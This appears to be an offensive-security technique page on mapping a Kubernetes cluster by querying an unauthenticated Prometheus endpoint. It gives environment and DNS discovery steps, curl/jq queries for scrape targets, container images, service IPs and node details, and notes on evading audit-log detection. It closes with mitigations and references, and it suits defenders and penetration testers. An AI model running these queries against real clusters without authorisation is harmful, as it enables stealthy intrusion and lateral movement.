---
title: Cluster Reconnaissance via Prometheus
description: Querying an unauthenticated Prometheus endpoint to map cluster topology without touching the Kubernetes API
category: offensive
phase: reconnaissance
createdAt: 2026-04-11
impact: Exposes namespace names, pod identities, container image versions, internal service IPs, and node details without generating any Kubernetes API audit events
mitigation:
  - Enable **authentication and authorization** on the Prometheus endpoint. The `--web.config.file` flag supports TLS and basic auth. In production, use a reverse proxy or service mesh policy to enforce identity before granting access
  - Apply a **NetworkPolicy** that restricts ingress to the Prometheus Service to only known scraper or dashboard namespaces, blocking arbitrary pods from querying the API
  - Audit **who has access** to the Prometheus Service or its port-forward equivalent and treat it as a sensitive internal service, not a read-only dashboard
  - Strip or relabel **sensitive label dimensions** (e.g. `system_uuid`, `internal_ip`, `kernel_version`) from kube-state-metrics exports if they are not required for alerting
mitreTechniques:
  - T1046
  - T1082
  - T1613
references: |
  - [Prometheus Authentication Documentation](https://prometheus.io/docs/guides/basic-auth/)
  - [Prometheus HTTP API](https://prometheus.io/docs/prometheus/latest/querying/api/)
  - [Exposed Prometheus Exploit in Kubernetes](https://www.sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu)
---

Prometheus ships with **no authentication enabled by default**. The HTTP query API on port `9090` is accessible to anyone who can reach the service, with no token, password, or certificate required. This is a deliberate design choice for ease of deployment, but in a Kubernetes cluster it means any compromised pod in the same namespace, or any pod with network access to the monitoring namespace, can query the full metrics database.

The critical characteristic of this technique is that **it requires zero Kubernetes API calls**. Every discovery action goes directly to the Prometheus HTTP API. The Kubernetes API server audit log, which defenders rely on to detect reconnaissance (see: `SelfSubjectRulesReview` abuse), records nothing.

## The attack sequence

The attacker discovers the Prometheus endpoint and queries its API to map the cluster without touching the Kubernetes API.

### Step 1: Discover the Prometheus endpoint

From inside a compromised pod, locate Prometheus using environment variables or DNS probes.

Prometheus collects metrics from three sources that together produce a complete cluster map:

- **kube-state-metrics** translates Kubernetes object state into metric series. Every pod, service, node, deployment, and namespace is represented as a labeled time series. The labels attached to each series carry the actual Kubernetes metadata: namespace names, pod names, container image references, service cluster IPs, and node system details.
- **Node exporter** exposes host-level metrics including filesystem paths, network interface names, and CPU/memory topology. These reveal node hardware characteristics that inform further exploitation decisions.
- **cAdvisor** (built into kubelet, scraped via the node role) exposes per-container resource usage including image names and container IDs currently running on each node.

## Discovering the Prometheus Endpoint

From inside a compromised pod, Prometheus is reachable via its cluster DNS name. The service name is typically predictable, as Helm chart defaults produce names like `prometheus-server.<namespace>.svc.cluster.local`. The service is discoverable without any API calls by checking environment variables injected into the pod at startup.

> [!NOTE]
> Kubernetes automatically injects `{SERVICENAME}_SERVICE_HOST` and `{SERVICENAME}_SERVICE_PORT` variables for every service in the same namespace, making it possible to locate Prometheus entirely passively before any network probe is made. This behavior is covered in detail under [Internal Cluster Discovery](/topics/internal-cluster-discovery).

```bash
env | grep -i prometheus
```

```output
PROMETHEUS_SERVER_SERVICE_HOST=10.105.10.15
PROMETHEUS_SERVER_SERVICE_PORT=80
PROMETHEUS_SERVER_PORT_80_TCP=tcp://10.105.10.15:80
PROMETHEUS_SERVER_PORT_80_TCP_ADDR=10.105.10.15
PROMETHEUS_SERVER_PORT_80_TCP_PORT=80
PROMETHEUS_ALERTMANAGER_SERVICE_HOST=10.97.83.91
PROMETHEUS_ALERTMANAGER_SERVICE_PORT=9093
PROMETHEUS_PROMETHEUS_PUSHGATEWAY_SERVICE_HOST=10.97.153.65
PROMETHEUS_PROMETHEUS_PUSHGATEWAY_SERVICE_PORT=9091
PROMETHEUS_KUBE_STATE_METRICS_SERVICE_HOST=10.103.39.182
PROMETHEUS_KUBE_STATE_METRICS_SERVICE_PORT=8080
PROMETHEUS_PROMETHEUS_NODE_EXPORTER_SERVICE_HOST=10.99.107.229
PROMETHEUS_PROMETHEUS_NODE_EXPORTER_SERVICE_PORT=9100
```

If environment variable injection is disabled, DNS resolution still works for known namespace targets:

```bash
curl -s http://prometheus-server.monitoring.svc.cluster.local/-/healthy
# Prometheus Server is Healthy.
```

## Enumerating Targets

The `/api/v1/targets` endpoint returns every scrape target Prometheus has discovered including the full label set used to identify each target, covering pod names, namespace, node assignment, and the scrape URL:

```bash
curl -s http://prometheus-server.monitoring.svc.cluster.local/api/v1/targets \
  | jq '.data.activeTargets[] | {job: .labels.job, url: .scrapeUrl, labels: .labels}'
```

From a single request, the attacker learns every monitored component in the cluster including which namespaces exist, what jobs are running, and the internal IP and port of each scrape endpoint.

## Harvesting Container Images and Versions

The `kube_pod_container_info` metric series exposes every running container's image, tag, and image ID across all namespaces. This gives the attacker a full inventory of every running container image and version across the cluster:

```bash
curl -s "http://prometheus-server.monitoring.svc.cluster.local/api/v1/query?query=kube_pod_container_info" \
  | jq '.data.result[] | {namespace: .metric.namespace, pod: .metric.pod, container: .metric.container, image: .metric.image}'
```

Example output from a real cluster:

```
{ "namespace": "argocd",      "pod": "argocd-repo-server-779879c89d-fwmxp",      "container": "argocd-repo-server",              "image": "quay.io/argoproj/argocd:v3.3.6"                      }
{ "namespace": "istio-system", "pod": "istiod-6b4df59d4b-lsbzz",                  "container": "discovery",                       "image": "istio/pilot:1.23.3"                                  }
{ "namespace": "kube-system",  "pod": "kube-apiserver-minikube",                  "container": "kube-apiserver",                  "image": "registry.k8s.io/kube-apiserver:v1.35.1"              }
```

## Mapping Internal Services

The `kube_service_info` metric maps every Service object to its cluster IP:

```bash
curl -s "http://prometheus-server.monitoring.svc.cluster.local/api/v1/query?query=kube_service_info" \
  | jq '.data.result[] | {namespace: .metric.namespace, service: .metric.service, cluster_ip: .metric.cluster_ip}'
```

This reveals the full internal service map, equivalent to what `kubectl get svc -A` returns, without touching the API server:

```
{ "namespace": "argocd",     "service": "argocd-server",      "cluster_ip": "10.99.45.237"  }
{ "namespace": "argocd",     "service": "argocd-redis",        "cluster_ip": "10.106.147.79" }
{ "namespace": "kube-system","service": "kube-dns",            "cluster_ip": "10.96.0.10"    }
```

## Extracting Node Details

The `kube_node_info` metric exposes host-level details that extend beyond what is typically considered metric data:

```bash
curl -s "http://prometheus-server.monitoring.svc.cluster.local/api/v1/query?query=kube_node_info" \
  | jq '.data.result[].metric'
```

A single node returns:

```json
{
  "container_runtime_version": "docker://29.2.1",
  "internal_ip": "192.168.49.2",
  "kernel_version": "6.12.54-linuxkit",
  "kubelet_version": "v1.35.1",
  "os_image": "Debian GNU/Linux 12 (bookworm)",
  "pod_cidr": "10.244.0.0/24",
  "system_uuid": "e366bd4b77b9d6be2d67552f69964f40"
}
```

The `pod_cidr` reveals the full pod network range, which is useful for lateral movement planning. The `container_runtime_version` field reveals the runtime type and version, which indicates the expected socket path on the host. The `system_uuid` is a stable hardware identifier that persists across reboots and can be used to correlate node identity across different data sources.

## Why This Evades Detection

Standard Kubernetes intrusion detection focuses on the API server audit log. Techniques like `kubectl auth can-i`, `SelfSubjectRulesReview`, and direct `kubectl get` commands all generate audit events that anomaly detection systems alert on.

This technique produces no Kubernetes API events because the attacker never calls the Kubernetes API. The only observable signal is HTTP traffic to the Prometheus Service, which blends into normal scraper and dashboard traffic. Unless the cluster has application-layer network flow analysis, this technique is invisible to standard audit-based detection.

